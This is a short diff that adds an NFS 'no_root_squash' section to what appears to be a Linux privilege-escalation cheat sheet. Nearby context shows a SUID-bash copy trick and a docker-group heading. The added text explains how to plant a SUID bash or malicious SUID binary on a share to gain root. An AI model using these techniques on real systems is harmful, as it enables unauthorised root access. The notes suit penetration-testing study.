@@ -254,6 +254,12 @@ echo "#\!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
 # Once the scirpt is executed, you will be able to run /tmp/bash -p to escalate to the user who owns the file.
 ```
 
+### *NFS ROOT SQUASHING:* ###
+```bash
+cat /etc/exports # The file which tells what folders can be mounted as a file share. You are looking for 'no_root_squash' on a mount point mentioned in this file.
+# We can now mount the share, and create a SUID copy of bash and put it into this share, or a malicious SUID binary which runs bash as root (setting UID and GID to 0).
+```
+
 
 ### *Docker:* ###
 If the user is in the docker group, you can escalate with no special permissions:
